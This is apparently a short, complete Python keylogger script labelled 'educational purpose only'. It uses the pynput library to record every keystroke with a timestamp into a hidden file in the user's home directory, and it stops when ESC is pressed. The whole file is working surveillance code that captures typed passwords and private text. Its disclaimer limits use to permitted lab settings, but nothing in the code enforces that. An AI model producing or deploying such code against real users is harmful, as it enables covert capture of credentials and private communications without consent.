"""
🔐 Simple Python Keylogger (Educational Purpose Only)

Important:
- Captures keyboard input and logs it to a file named 'keylog.txt'.
- Use ONLY with explicit permission in a legal environment (e.g., labs).
- Misuse may violate laws and lead to serious consequences.

Requires: pip install pynput
Stop Logging: Press ESC key
"""

import os
import sys
from datetime import datetime

# Check for pynput installation
try:
    from pynput import keyboard
except ImportError:
    print("The 'pynput' module is not installed.\nInstall it using: pip install pynput")
    sys.exit(1)

# Directory to store log file (e.g., in user's home)
log_dir = os.path.join(os.path.expanduser("~"), "keylogs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".keylog.txt")  # Hidden on Linux/macOS

def on_press(key):
    try:
        with open(log_file, "a") as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"{timestamp} - {key.char}\n")
            else:
                f.write(f"{timestamp} - [{key.name if hasattr(key, 'name') else str(key)}]\n")
    except Exception as e:
        # Optional: Log error for debugging
        with open(os.path.join(log_dir, "error_log.txt"), "a") as ef:
            ef.write(f"{datetime.now()} - Error: {str(e)}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[+] ESC detected. Stopping keylogger.")
        return False

def main():
    print("[*] Starting keylogger. Press ESC to stop.")
    print(f"[*] Logging keystrokes to: {log_file}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
